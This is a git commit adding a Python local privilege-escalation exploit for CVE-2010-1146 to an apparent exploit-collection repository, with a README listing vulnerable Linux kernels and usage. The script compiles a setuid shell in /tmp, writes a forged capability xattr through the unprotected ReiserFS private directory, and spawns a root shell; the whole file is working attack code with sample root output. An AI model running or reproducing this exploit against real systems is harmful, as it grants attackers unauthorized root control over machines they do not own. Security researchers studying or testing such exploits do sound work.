SecWiki__linux-kernel-exploits
commit 1a604c63f5424fce74df58df571717e6effcdc2d
Author:     Gitmaninc <gitman@foxmail.com>
AuthorDate: Sun May 14 11:11:33 2017 -0400
Commit:     Gitmaninc <gitman@foxmail.com>
CommitDate: Sun May 14 11:11:33 2017 -0400

    CVE-2010-1146

diff --git a/CVE-2010-1146/12130.py b/CVE-2010-1146/12130.py
new file mode 100644
index 0000000..8854d5e
--- /dev/null
+++ b/CVE-2010-1146/12130.py
@@ -0,0 +1,111 @@
+#!/usr/bin/env python
+
+''' 
+  team-edward.py
+ 
+  Linux Kernel <= 2.6.34-rc3 ReiserFS xattr Privilege Escalation
+  Jon Oberheide <jon@oberheide.org>
+  http://jon.oberheide.org
+  
+  Information:
+ 
+    https://bugzilla.redhat.com/show_bug.cgi?id=568041
+
+    The kernel allows processes to access the internal ".reiserfs_priv"
+    directory at the top of a reiserfs filesystem which is used to store 
+    xattrs. Permissions are not enforced in that tree, so unprivileged 
+    users can view and potentially modify the xattrs on arbitrary files.
+
+  Usage:
+ 
+    $ python team-edward.py
+    [+] checking for reiserfs mount with user_xattr mount option
+    [+] checking for private xattrs directory at /.reiserfs_priv/xattrs
+    [+] preparing shell in /tmp
+    [+] capturing pre-shell snapshot of private xattrs directory
+    [+] compiling shell in /tmp
+    [+] setting dummy xattr to get reiserfs object id
+    [+] capturing post-shell snapshot of private xattrs directory
+    [+] found 1 new object ids
+    [+] setting cap_setuid/cap_setgid capabilities on object id 192B.1468
+    [+] spawning setuid shell...
+    # id
+    uid=0(root) gid=0(root) groups=4(adm), ...
+ 
+  Notes:
+ 
+    Obviously requires a ReiserFS filesystem mounted with extended attributes.
+    Tested on Ubuntu Jaunty 9.10.
+''' 
+
+import os, sys
+
+SHELL = 'int main(void) { setgid(0); setuid(0); execl("/bin/sh", "sh", 0); }'
+XATTR = '\x41\x58\x46\x52\xc1\x00\x00\x02\x01\x00\x00\x02\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+
+def err(txt):
+    print '[-] error: %s' % txt
+    sys.exit(1)
+
+def msg(txt):
+    print '[+] %s' % txt
+
+def main():
+    msg('checking for reiserfs mount with user_xattr mount option')
+
+    f = open('/etc/fstab')
+    for line in f:
+        if 'reiserfs' in line and 'user_xattr' in line:
+            break
+    else:
+        err('failed to find a reiserfs mount with user_xattr')
+    f.close()
+
+    msg('checking for private xattrs directory at /.reiserfs_priv/xattrs')
+
+    if not os.path.exists('/.reiserfs_priv/xattrs'):
+        err('failed to locate private xattrs directory')
+
+    msg('preparing shell in /tmp')
+
+    f = open('/tmp/team-edward.c', 'w')
+    f.write(SHELL)
+    f.close()
+
+    msg('capturing pre-shell snapshot of private xattrs directory')
+
+    pre = set(os.listdir('/.reiserfs_priv/xattrs'))
+    
+    msg('compiling shell in /tmp')
+
+    ret = os.system('gcc -w /tmp/team-edward.c -o /tmp/team-edward')
+    if ret != 0:
+        err('error compiling shell, you need gcc')
+
+    msg('setting dummy xattr to get reiserfs object id')
+
+    os.system('setfattr -n "user.hax" -v "hax" /tmp/team-edward')
+    if ret != 0:
+        err('error setting xattr, you need setfattr')
+
+    msg('capturing post-shell snapshot of private xattrs directory')
+
+    post = set(os.listdir('/.reiserfs_priv/xattrs'))
+
+    objs = post.difference(pre)
+
+    msg('found %s new object ids' % len(objs))
+
+    for obj in objs:
+        msg('setting cap_setuid/cap_setgid capabilities on object id %s' % obj)
+   
+        f = open('/.reiserfs_priv/xattrs/%s/security.capability' % obj, 'w')
+        f.write(XATTR)
+        f.close()
+
+    msg('spawning setuid shell...')
+
+    os.system('/tmp/team-edward')
+
+if __name__ == '__main__':
+    main()
diff --git a/CVE-2010-1146/README.md b/CVE-2010-1146/README.md
new file mode 100644
index 0000000..0148ac4
--- /dev/null
+++ b/CVE-2010-1146/README.md
@@ -0,0 +1,19 @@
+# CVE-2010-1146
+
+CVE-2010-1146
+
+Vulnerability reference:
+ * [CVE-2010-1146](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2010-1146)  
+ * [exp-db](https://www.exploit-db.com/exploits/12130/)  
+
+## Kernels
+```
+2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34
+```   
+
+## Usage
+```
+$ python team-edward.py
+```  
+
+
